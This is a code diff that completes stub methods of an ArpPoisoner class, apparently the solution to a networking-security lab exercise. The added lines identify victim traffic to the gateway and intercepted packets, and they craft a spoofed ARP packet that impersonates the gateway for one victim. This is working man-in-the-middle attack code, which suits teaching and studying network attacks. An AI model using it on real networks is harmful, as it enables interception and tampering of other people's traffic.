@@ -17,7 +17,9 @@ class ArpPoisoner(object):
 
         Note: You may assume all packets have both IP and Ethernet layers.
         """
-        raise NotImplementedError()
+        ip = packet.getlayer(S.IP)
+        ethernet = packet.getlayer(S.Ether)
+        return (ip.src != self.our_ip and ethernet.dst == self.gateway_mac)
 
     def is_stolen_packet(self, packet):
         """
@@ -26,7 +28,9 @@ class ArpPoisoner(object):
 
         Note: You may assume all packets have both IP and Ethernet layers.
         """
-        raise NotImplementedError()
+        ip = packet.getlayer(S.IP)
+        ethernet = packet.getlayer(S.Ether)
+        return (ip.dst != self.our_ip and self.our_mac == ethernet.dst)
 
     def packet_filter(self, packet):
         """
@@ -50,7 +54,9 @@ class ArpPoisoner(object):
         2. Don't poison everyone on the network - poison only this specific
            victim.
         """
-        raise NotImplementedError()
+        victim_ip = victim_packet[S.IP]
+
+        return S.ARP(op = "who-has", psrc = self.gateway_ip, pdst = victim_ip.src, hwsrc = self.our_mac)
 
     def handle_packet(self, packet):
         """
